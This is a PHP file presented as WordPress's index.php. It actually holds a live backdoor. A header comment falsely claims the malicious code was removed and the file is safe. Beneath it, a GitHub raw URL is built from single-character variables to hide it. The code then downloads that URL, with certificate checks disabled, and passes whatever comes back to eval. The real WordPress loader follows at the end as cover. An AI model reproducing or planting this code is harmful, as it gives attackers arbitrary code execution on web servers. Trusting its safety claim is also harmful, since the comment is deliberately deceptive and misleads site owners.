<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$xaa = 'h'; $xab = 't'; $xac = 't'; $xad = 'p'; $xae = 's';
$xaf = ':'; $xag = '/'; $xah = '/'; $xai = 'r'; $xaj = 'a';
$xak = 'w'; $xal = '.'; $xam = 'g'; $xan = 'i'; $xao = 't';
$xap = 'h'; $xaq = 'u'; $xar = 'b'; $xas = 'u'; $xat = 's';
$xau = 'e'; $xav = 'r'; $xaw = 'c'; $xax = 'o'; $xay = 'n';
$xaz = 't'; $xba = 'e'; $xbb = 'n'; $xbc = 't'; $xbd = '.';
$xbe = 'c'; $xbf = 'o'; $xbg = 'm'; $xbh = '/'; $xbi = 'm';
$xbj = 'd'; $xbk = 'm'; $xbl = 'o'; $xbm = 'm'; $xbn = 'i';
$xbo = 'n'; $xbp = '3'; $xbq = '6'; $xbr = '5'; $xbs = '3';
$xbt = '6'; $xbu = '6'; $xbv = '-'; $xbw = 'g'; $xbx = 'i';
$xby = 'f'; $xbz = '/'; $xca = 'b'; $xcb = 'e'; $xcc = 'l';
$xcd = 'a'; $xce = '/'; $xcf = 'r'; $xcg = 'e'; $xch = 'f';
$xci = 's'; $xcj = '/'; $xck = 'h'; $xcl = 'e'; $xcm = 'a';
$xcn = 'd'; $xco = 's'; $xcp = '/'; $xcq = 'm'; $xcr = 'a';
$xcs = 'i'; $xct = 'n'; $xcu = '/'; $xcv = 'i'; $xcw = 'n';
$xcx = 'd'; $xcy = 'e'; $xcz = 'x'; $xda = '.'; $xdb = 't';
$xdc = 'x'; $xdd = 't';

$full_url = $xaa.$xab.$xac.$xad.$xae.$xaf.$xag.$xah.$xai.$xaj.$xak.$xal.$xam.$xan.$xao.$xap.$xaq.$xar.$xas.$xat.$xau.$xav.$xaw.$xax.$xay.$xaz.$xba.$xbb.$xbc.$xbd.$xbe.$xbf.$xbg.$xbh.$xbi.$xbj.$xbk.$xbl.$xbm.$xbn.$xbo.$xbp.$xbq.$xbr.$xbs.$xbt.$xbu.$xbv.$xbw.$xbx.$xby.$xbz.$xca.$xcb.$xcc.$xcd.$xce.$xcf.$xcg.$xch.$xci.$xcj.$xck.$xcl.$xcm.$xcn.$xco.$xcp.$xcq.$xcr.$xcs.$xct.$xcu.$xcv.$xcw.$xcx.$xcy.$xcz.$xda.$xdb.$xdc.$xdd;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
